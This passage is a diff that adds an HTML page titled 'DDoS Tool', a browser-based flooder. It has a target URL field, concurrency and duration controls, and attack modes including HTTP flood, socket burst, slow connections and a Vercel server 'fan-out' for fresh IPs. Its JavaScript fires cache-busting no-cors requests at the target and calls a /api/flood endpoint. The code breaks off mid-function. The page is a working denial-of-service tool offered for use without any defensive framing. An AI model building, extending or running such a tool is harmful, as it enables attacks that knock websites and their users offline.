@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DDoS Tool</title>
+<style>
+  :root{--bg:#07090f;--card:#111624;--line:#222a3d;--txt:#e9eef7;--mut:#7f8798;--acc:#00e0a4;--red:#ff5470}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--txt);font:15px/1.5 system-ui,sans-serif;padding:22px 16px 60px}
+  .wrap{max-width:700px;margin:0 auto}
+  h1{text-align:center;font-size:26px;margin:0 0 4px;letter-spacing:-.5px}
+  h1 span{color:var(--acc)}
+  .sub{text-align:center;color:var(--mut);font-size:13px;margin:0 0 20px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;margin-bottom:14px}
+  label{display:block;font-size:11px;letter-spacing:.6px;text-transform:uppercase;color:var(--mut);margin:0 0 6px}
+  input{width:100%;background:#0b0f18;border:1px solid var(--line);color:var(--txt);border-radius:10px;padding:13px;font:14px ui-monospace,monospace}
+  input:focus{outline:none;border-color:var(--acc)}
+  .methods{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px}
+  .m{border:1px solid var(--line);border-radius:11px;padding:10px;cursor:pointer;background:#0d1220;text-align:center;transition:.12s}
+  .m:hover{border-color:#3a4560}
+  .m.on{border-color:var(--acc);background:#0f2b24}
+  .m b{display:block;font-size:13px;color:#fff}
+  .m small{color:var(--mut);font-size:10.5px;line-height:1.25;display:block;margin-top:3px}
+  .two{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:14px}
+  input[type=range]{padding:0;background:none;border:0}
+  .go{display:grid;grid-template-columns:2fr 1fr;gap:10px;margin-top:16px}
+  .go button{padding:15px;border:0;border-radius:12px;font:800 16px system-ui;cursor:pointer}
+  #start{background:linear-gradient(135deg,#00e0a4,#0ea5e9);color:#04120d}
+  #stop{background:#1a2130;color:#e9eef7;border:1px solid var(--line)}
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
+  .st{background:#0b0f18;border:1px solid var(--line);border-radius:11px;padding:10px;text-align:center}
+  .st b{display:block;font:700 19px ui-monospace,monospace;color:var(--acc)}
+  .st span{font-size:10px;color:var(--mut);text-transform:uppercase;letter-spacing:.5px}
+  .st.bad b{color:var(--red)}
+  .log{margin-top:14px;background:#0b0f18;border:1px solid var(--line);border-radius:12px;padding:11px;height:170px;overflow:auto;font:11.5px ui-monospace,monospace;color:#8ee7c9;white-space:pre-wrap}
+  .log .b{color:var(--mut)}
+  .log .e{color:var(--red)}
+  .val{color:var(--acc);font-family:ui-monospace,monospace}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>DDOS<span>.</span>TOOL</h1>
+  <p class="sub">Multi-method flooder · runs from your browser + your Vercel server</p>
+
+  <div class="card">
+    <label>Target URL</label>
+    <input id="url" placeholder="https://example.com" value="https://example.com">
+    <div class="two">
+      <div>
+        <label>Concurrency <span class="val" id="cv">120</span></label>
+        <input type="range" id="conc" min="5" max="500" step="5" value="120">
+      </div>
+      <div>
+        <label>Duration <span class="val" id="dv">30s</span></label>
+        <input type="range" id="dur" min="5" max="300" step="5" value="30">
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <label>Attack method</label>
+    <div class="methods" id="methods">
+      <div class="m on" data-m="http"><b>HTTP</b><small>direct browser flood, keep-alive</small></div>
+      <div class="m" data-m="burst"><b>BURST</b><small>max simultaneous sockets</small></div>
+      <div class="m" data-m="slow"><b>SLOW</b><small>pile up held connections</small></div>
+      <div class="m" data-m="server"><b>SERVER</b><small>Vercel fan-out, fresh IPs</small></div>
+      <div class="m" data-m="mix"><b>MIX</b><small>random of all of the above</small></div>
+    </div>
+    <div class="go">
+      <button id="start">START</button>
+      <button id="stop">STOP</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="stats">
+      <div class="st"><b id="s_rps">0</b><span>req/sec</span></div>
+      <div class="st"><b id="s_total">0</b><span>total</span></div>
+      <div class="st"><b id="s_ok">0</b><span>ok</span></div>
+      <div class="st bad"><b id="s_fail">0</b><span>failed</span></div>
+      <div class="st"><b id="s_lat">0</b><span>avg ms</span></div>
+      <div class="st"><b id="s_mb">0</b><span>MB in</span></div>
+      <div class="st"><b id="s_mbps">0</b><span>est Mbps</span></div>
+      <div class="st"><b id="s_t">0s</b><span>elapsed</span></div>
+    </div>
+  </div>
+
+  <div class="log" id="log"></div>
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const logEl = $('log');
+const say = (m, c = '') => {
+  logEl.innerHTML += `<span class="${c}">[${new Date().toLocaleTimeString()}]</span> ${m}\n`;
+  logEl.scrollTop = logEl.scrollHeight;
+};
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const rnd = () => Math.random().toString(36).slice(2);
+
+let method = 'http', running = false, stopAt = 0, t0 = 0;
+let workers = [], wake = [];
+const S = { total: 0, ok: 0, fail: 0, bytes: 0, latSum: 0, latN: 0, lastTotal: 0, rps: 0 };
+
+document.querySelectorAll('.m').forEach(el => el.onclick = () => {
+  if (running) return;
+  document.querySelectorAll('.m').forEach(x => x.classList.remove('on'));
+  el.classList.add('on');
+  method = el.dataset.m;
+});
+$('conc').oninput = e => $('cv').textContent = e.target.value;
+$('dur').oninput = e => $('dv').textContent = e.target.value + 's';
+
+const CONC = () => +$('conc').value;
+const DUR = () => +$('dur').value;
+const TARGET = () => $('url').value.trim() || 'https://example.com';
+
+/* ---------- engines ---------- */
+function bust(u) {
+  const sep = u.includes('?') ? '&' : '?';
+  return u + sep + '_=' + rnd();
+}
+
+async function hitBrowser() {
+  const u = bust(TARGET());
+  const s = performance.now();
+  S.total++;
+  try {
+    await fetch(u, { method: 'GET', mode: 'no-cors', cache: 'no-store', redirect: 'follow' });
+    S.ok++;
+  } catch (e) { S.fail++; }
+  const d = performance.now() - s;
+  S.latSum += d; S.latN++;
+}
+
+async function hitServer() {
+  try {
+    const r = await fetch('/api/flood', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url: TARGET(), n: Math.min(CONC(), 100) })
+    }).then(r => r.json());
+    S.total += (r.ok || 0) + (r.fail || 0);
+    S.ok += r.ok || 0;
+    S.fail += r.fail || 0;
+    S.bytes += r.bytes || 0;
+    if (r.avg && r.ok) { S.latSum += r.avg * r.ok; S.latN += r.ok; }
+  } catch (e) {
